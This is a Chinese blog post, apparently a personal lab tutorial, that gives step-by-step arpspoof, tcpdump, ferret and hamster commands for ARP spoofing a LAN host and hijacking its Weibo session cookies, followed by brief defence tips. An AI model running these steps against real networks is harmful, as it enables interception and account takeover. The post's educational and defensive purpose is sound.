---
layout:     post
title:      "局域网攻击之 ARP 欺骗"
subtitle:   "使用 Kali Linux 下的 arpspoof, tcpdump, ferret, hamster 通过 ARP 攻击实现 Cookie 劫持"
date:       2016-06-23 21:32 +0800
author:     "gsfish"
header-img: "img/post-bg-kali.jpg"
tags:
    - 内网
    - ARP
---

> 大部分内容都是参考的网上的教程，但还是想照着试试并记录一下

#### 基本环境：

> 网关：  
> 192.168.1.1  
>   
> 攻击者：  
> IP: 192.168.1.110  
> OS: Kali Linux (VirtualBox)  
>   
> 靶机：  
> IP: 192.168.1.105  
> OS: Windows 10  

---

## 0x00 说下思路

- 首先通过 ARP 欺骗使靶机与网关间的数据包经由攻击者主机转发
- 等待目标用户进行登陆操作，抓取 HTTP 数据包
- 解析所抓取的数据包，并提取出 Cookie
- 将 Cookie 导入浏览器，从而实现劫持目标用户的会话

---

## 0x01 事前准备

#### 一、安装 ferret

除 ferret 的其他 3 个工具已经集成在 Kali 中了，我们要自行安装 ferret（64 位 Kali 需要增加对 32 位程序的支持才能在源中找到它）。这个工具连同 hamster 是由一个叫 [Robert Graham](https://github.com/robertdavidgraham) 的黑客开发的。

1) 增加对 32 位程序的支持

`root@kali:~# dpkg --add-architecture i386`

2) 更新源

`root@kali:~# apt-get update`

3) 安装

`root@kali:~# apt-get install ferret-sidejack`

#### 二、开启 IP 转发

使用 arpspoof 进行 ARP 欺骗前需要开启本机的 IP 转发（这个临时的，重启后会失效），不然目标用户在攻击期间会无法上网，从而起疑。

`root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward`

---

## 0x02 作战开始

#### 一、进行 ARP 欺骗

`root@kali:~# arpspoof -i eth0 -t 192.168.1.105 192.168.1.1`

![01.png](/img/lan-attack-cookie-hijack/01.png)

`root@kali:~# arpspoof -i eth0 -t 192.168.1.1 192.168.1.105`

![02.png](/img/lan-attack-cookie-hijack/02.png)

> 参数解释  
> **-i**    所用的网卡设备名  
> **-t**    攻击目标的 IP（由于是单向的，所以需要开启两个）

这两个窗口在攻击过程中要一直保持。然后进入靶机，打开命令提示符。

`WIN + R` 输入 `cmd`

在靶机中看一下效果。

`C:\Users\gsfish>arp -a`

> 参数解释  
> **-a**    通过询问当前协议数据，显示当前 ARP 项

![03.png](/img/lan-attack-cookie-hijack/03.png)

Bingo~ 可以看到 ARP 缓存表中网关的 MAC 已经变成攻击者的了，取得初步胜利~

#### 二、抓取 HTTP 数据包

`root@kali:~# tcpdump -i eth0 tcp port 80 and host 192.168.1.105 -w cookie.cap`

> 参数解释  
> **-i**    所用的网卡设备名  
> **-w**    生成数据包的名称  
> **tcp port 80 and host 192.168.1.105**    抓取通过 192.168.1.105:80 的数据包

等待目标用户登陆网站或访问任何登陆后的页面，于是就可以抓到含有 Cookie 的 HTTP 数据包了。过一段时间后停止抓取（这只能抓取 HTTP 流量，如果网站启用了 HTTPS 就需要采用新的姿势了，例如 SSLstrip）。

![04.png](/img/lan-attack-cookie-hijack/04.png)

在家目录下会生成一个 `cookie.cap` 文件，这就是我们一直在抓的数据包了。然而现在我们还看不懂其中的内容，需要用 ferret 来解析一下。

#### 三、解析 cookie.cap

`root@kali:~# ferret -r cookie.cap`

> 参数解释  
> **-r**    读取数据包并将其解析，生成 hamster.txt  
> **-i**    所用的网卡设备名（其实 ferret 也有抓包的功能）

![05.png](/img/lan-attack-cookie-hijack/05.png)

此时数据包中的内容已被解析并保存到了家目录中的 `hamster.txt`。

#### 四、加载 Cookie，模拟登陆

`root@kali:~# hamster`

hamster 是一个十分高效的工具，直接输入命令即可打开。虽然 Firefox 的一些插件自定义 Cookie，但 hamster 能很方便地把我们生成的 `hamster.txt` 中的 Cookie 信息自动导入到浏览器中。

![06.png](/img/lan-attack-cookie-hijack/06.png)

打开浏览器，设置代理为 `127.0.0.1`，端口 `1234`。

![07.png](/img/lan-attack-cookie-hijack/07.png)

在地址栏输入 `127.0.0.1:1234`。点击 `192.168.1.105`，接着出现以下页面。

![08.png](/img/lan-attack-cookie-hijack/08.png)

在左侧栏我们看到了 `http://weibo.com/...`。嘿嘿嘿，点击链接，成功利用目标用户的 Cookie 登陆器其新浪微博。把这个地址复制到地址栏后就可以正常使用其微博的所有功能啦。

![09.png](/img/lan-attack-cookie-hijack/09.png)

---

## 0x03 关于防范

如果你平时大部分时间使用的都是公共网络，而你的身边恰好有人喜欢搞过安全，那就别浏览那些比较私密的东西啦。同时这也告诉我们，最好不要使用机场、餐厅这些公共场合的 WIFI 进行一些登陆的操作（除非使用了 VPN 或者 Tor）。

关于 ARP 攻击的防范方面，主机和路由器都需要进行相关设置的。路由器要在管理页面设置 MAC 绑定，而主机方面可以通过 `arp -s` 这个命令将网关的 IP 与 MAC 进行绑定。

同学 [@yungkcx](https://github.com/yungkcx) 刚好写了一篇相关的博客，在此安利一波：

[An ARP Attack](https://yungkcx.github.io/network/security/2016/06/10/An-ARP-Attack.html)

---

> 参考资料：  
> [『局域网安全』利用ARP欺骗劫持Cookie](http://www.cnblogs.com/anka9080/p/arpspoof.html)
